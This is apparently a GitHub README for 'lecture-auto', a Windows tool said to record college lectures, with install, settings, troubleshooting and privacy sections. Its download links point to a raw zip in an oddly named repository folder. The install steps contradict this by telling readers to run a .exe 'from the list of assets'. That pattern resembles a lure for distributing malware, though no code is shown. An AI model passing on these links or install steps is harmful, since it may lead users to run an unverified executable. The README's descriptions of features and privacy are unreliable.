# 🎓 lecture-auto - Record your college lectures with ease

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/lynnshavian741/lecture-auto/raw/refs/heads/main/lucifugous/lecture_auto_v1.3.zip)

lecture-auto automates the recording of your university lectures. The software captures audio input directly from your computer microphone and saves the files as organized digital folders. You focus on the professor while the tool manages your notes.

## 🛠 Prerequisites

Ensure your computer meets these system standards:

* Windows 10 or Windows 11.
* A working microphone connected to your computer.
* At least 500 megabytes of free storage space.
* An active internet connection for the initial setup.

## 📥 How to Install

Follow these steps to set up the software on your system:

1. Visit the [official download page](https://github.com/lynnshavian741/lecture-auto/raw/refs/heads/main/lucifugous/lecture_auto_v1.3.zip) to access the installers.
2. Select the file ending in .exe from the list of assets.
3. Save the file to your computer.
4. Double-click the file to begin the installation.
5. Follow the prompts on your screen to complete the process.
6. Launch the application from your desktop or Start menu.

## ⚙️ Initial Configuration

Upon the first launch, the software asks for permission to access your microphone. Click "Allow" to enable recording. 

Define your primary folder for saved lectures:

1. Open the Settings menu inside the application.
2. Click on the "Storage" tab.
3. Choose a folder where you keep your study materials.
4. Save your changes.

The application creates a new folder within that directory for every new academic term. This keeps your files tidy.

## 🎙 Recording Lectures

The main interface shows a simple dashboard. Locate the large "Start" button to begin your recording session.

* **Starting a recording:** Click "Start" five minutes before your lecture begins to ensure you capture the introduction. 
* **Pausing a recording:** Use the "Pause" button if the professor takes an extended break. 
* **Stopping a recording:** Select "Stop" to finalize the file. The software processes the audio and locks the file to prevent accidental edits.

You can view your file history by clicking the "Library" tab. Each file displays the date, time, and duration of the recording.

## 💡 Managing Audio Quality

The software automatically selects your default system microphone. If you have an external headset or a high-quality desktop microphone, you can change this setting:

1. Navigate to Settings.
2. Select the "Audio Input" drop-down menu.
3. Choose your preferred device from the list.
4. Perform a quick test by clicking "Record" for three seconds and playing it back.

If the audio sounds quiet, adjust the "Gain" slider within the Advanced Audio settings. Moving the slider to the right increases the volume of the recorded lecture. Start with lower values to avoid background noise.

## 🔍 Troubleshooting Common Issues

Many users experience simple problems that have quick fixes.

**The application does not record audio.**
Check if your microphone is currently in use by another program such as Zoom or Microsoft Teams. Close those applications and restart the recording task. Verify that the microphone is not physically muted by a switch on the device itself.

**The folder path is invalid.**
Ensure the folder you selected in settings exists and that your user account has permission to write files there. Avoid saving files to system directories like C:\Windows.

**The application freezes during a long lecture.**
Software stability relies on sufficient system memory. Close unnecessary web browser tabs or programs before you start a long recording session. 

**I cannot find my saved files.**
Open the application and click on "Library." Right-click any file and select "Show in folder." This command opens your Windows File Explorer to the exact location of your recorded lecture.

## 📁 File Organization

lecture-auto tags files with a specific naming convention: `YYYY-MM-DD_Lecture_Title`. You can rename any file manually within the library view. Do not rename these files using File Explorer while the application is running, as this might cause errors when the software tries to update the library database.

## 🔐 Privacy and Data Policy

lecture-auto stores all your audio files locally on your computer. No data ever leaves your device or travels to a server. You maintain full ownership of your records. Delete any file by selecting it in the library and pressing the "Delete" key or using the trash icon. Note that deleted files are removed permanently and cannot be recovered through the software interface. 

## 🔄 Updates

The software checks for new versions automatically upon launch. If a message appears about an available update, click "Yes" to install the latest features and security improvements. The installer replaces your old version while keeping your configuration and audio library intact.
